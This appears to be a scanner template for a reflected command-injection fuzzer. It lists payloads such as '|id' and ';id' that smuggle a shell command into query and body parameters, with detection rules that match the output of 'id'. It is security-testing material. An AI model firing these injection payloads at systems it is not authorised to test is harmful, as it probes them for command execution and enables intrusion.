id: cmd-inj-reflected-fuzz
type: fuzz
level: 4
info:
  name: Command Injection Reflected Fuzzer
  risk: High
payloads:
  - >-
    |id
  - >-
    |id --help
  - >-
    |id${IFS}--help
  - >-
    ;id
  - >-
    ||id

requests:
  - generators:
      - Query("[[.original]]{{.payload}}")
      - Body("[[.original]]{{.payload}}")
    detections:
      - >-
        StringSearch("response", "Usage: id [OPTION]... [USER]") ||
        ( StringSearch("response", "uid=") && StringSearch("response", "gid=") ) ||
        StringSearch("response", "id: command not found") ||
        StringSearch("response", "id: not found") ||
        StringSearch("response", "'id' not found") ||
        StringSearch("response", "'id' is not recognized as")
